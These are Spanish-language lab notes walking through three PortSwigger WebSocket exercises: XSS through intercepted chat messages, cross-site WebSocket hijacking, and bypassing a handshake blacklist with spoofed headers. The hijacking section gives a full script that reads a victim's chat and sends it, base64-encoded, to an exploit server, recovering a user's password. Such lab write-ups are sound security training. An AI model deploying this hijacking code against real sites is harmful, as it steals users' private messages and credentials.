------------

WebSocket es un protocolo de comunicación que permite la comunicación bidireccional y continua (full-duplex) entre un cliente y un servidor a través de una única conexión TCP. A diferencia del protocolo HTTP, que requiere que el cliente inicie cada interacción con el servidor y luego cierre la conexión, WebSocket mantiene un canal abierto para que ambos extremos puedan enviar y recibir datos en cualquier momento. Esta característica es ideal para aplicaciones que necesitan interacciones en tiempo real y de baja latencia, como chats, juegos multijugador o sistemas de notificación.

## PortSwigger

### Lab: Manipulating WebSocket messages to exploit vulnerabilities

Al parecer necesitamos explotar un XSS mediante el WebSocket.

Vamos a comenzar dejando que todo el trafico pase por el BurpSuite para poder analizarlo luego.

![[Pasted image 20250925212612.png]]

vemos como se están tramitando todas las peticiones pero en si dentro de las peticiones del chat nos dice de `Websocket`, para ver estas tenemos que irnos al historial de `Websocket` en el mimos BurpSuite:

![[Pasted image 20250925212809.png]]

vemos como estamos teniendo la comunicación en el chat de la web, esto es bueno, ahora vamos a intentar interceptar cuando enviamos un mensaje:

![[Pasted image 20250925212917.png]]

Vemos que esto se intercepta sin problema, podemos directamente intentar una inyección a ver que obtenemos:
![[Pasted image 20250925213031.png]]

al parecer esta bien configurado porque no vemos que se ejecute, podemos ver como se esta insertando para intentar otras variantes:
![[Pasted image 20250925213309.png]]

vemos que los  `<>` no se están interpretando correctamente, por alguna razón los convierte, podemos forzarlo a que se tramite como debe de ser a ver que logramos:
![[Pasted image 20250925213524.png]]

![[Pasted image 20250925213535.png]]

No vemos nada, podemos intentar alternativas como la siguiente:

![[Pasted image 20250925213623.png]]

![[Pasted image 20250925213641.png]]

Perfecto esto si a funcionado:

![[Pasted image 20250925213657.png]]

Lab Terminado.

### Lab: Cross-site WebSocket hijacking

Volvemos a tener un chat en vivo, donde vamos a emplear el exploit server, donde configuraremos con JavaScript nuestro código malicioso:

Vamos a analizar el trafico:
![[Pasted image 20250925214111.png]]

por lo que entiendo la secuencia es enviar ese `READY` y luego comenzamos con los mensajes.

Con lo anterior claro nuestro código para esto seria de la siguiente manera:
```html
<script>
var ws = new WebSocket("https://0a250004047b3030806844f000840052.web-security-academy.net/chat");

ws.onopen = function () {
  ws.send("READY");
};

ws.onmessage = function () {
  fetch("https://exploit-0af400560405302a807943c6019b00a6.exploit-server.net/?data=" + btoa(event.data));
};
</script>
```

![[Pasted image 20250925214733.png]]

vamos a enviar esto a la victima y vemos si en los logs recibimos la información:
![[Pasted image 20250925214817.png]]

perfecto vemos data tramitada en base64, vamos a todo eso en la consola a pasarlo a texto normal:

![[Pasted image 20250925215208.png]]

vemos que ya tenemos la contraseña de carlos:

![[Pasted image 20250925215244.png]]

Lab Terminada.

### Lab: Manipulating the WebSocket handshake to exploit vulnerabilities

En este laboratorio vamos a explotar un XSS donde el objetivo es lanzar una `alert()`.

Como ya vimos en el caso anterior que nos funciono el jugar con las etiquetas sino que las manipulamos interceptando con BurpSuite vamos a intentar de primeras eso:

![[Pasted image 20250925215643.png]]

bueno al intentarlo nos desconecta y por ultimo nos mete en una blacklist la cual no nos deja ni ver el chat ya:
![[Pasted image 20250925215711.png]]

En este punto podemos interceptar esto e intentar con cabeceras que ya conocemos para intentar eludir esto:
![[Pasted image 20250925215820.png]]

Bueno vemos que esto funciona pero tendríamos que estar editando todas las requests para poner la cabecera y no es optimo, vamos a configurar en el proxy lo siguiente:
![[Pasted image 20250925220057.png]]

bueno con esto ya debería estar funcionando de nuevo:

![[Pasted image 20250925220141.png]]

Bueno vamos a volver a intentar lo mismo pero representado de otra manera, que seria la siguiente:

![[Pasted image 20250925220318.png]]

![[Pasted image 20250925220331.png]]

nos vuelve a detectar pero en esta ocasión directamente nos dice `Alert` puede que eso no le guste vamos a intentar de otra forma:
![[Pasted image 20250925220510.png]]

vamos a intentar en este caso sin los paréntesis y la forma correcta es como la vemos en la imagen, vamos a intentarlo:

![[Pasted image 20250925220554.png]]

Eso ya le gusto, vamos ahora sí a ver si se completo el lab:
![[Pasted image 20250925220619.png]]

Lab Terminado.